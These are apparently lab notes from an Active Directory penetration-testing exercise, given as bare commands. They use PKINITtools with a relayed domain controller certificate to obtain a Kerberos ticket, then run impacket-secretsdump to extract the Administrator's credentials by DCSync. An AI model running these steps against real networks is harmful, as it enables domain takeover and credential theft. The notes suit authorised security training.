

```
git clone https://github.com/dirkjanm/PKINITtools.git && cd PKINITtools
```


```
pip3 install -r requirements.txt
```


```
python3 gettgtpkinit.py -cert-pfx ../krbrelayx/DC01\$.pfx -dc-ip 10.129.234.109 'inlanefreight.local/dc01$' /tmp/dc.ccache
```


```
export KRB5CCNAME=/tmp/dc.ccache
```

```
impacket-secretsdump -k -no-pass -dc-ip 10.129.234.109 -just-dc-user Administrator 'INLANEFREIGHT.LOCAL/DC01$'@DC01.INLANEFREIGHT.LOCAL
```




#Note :  If version mismatch occurs 

```
pip3 install -I git+https://github.com/wbond/oscrypto.git
```
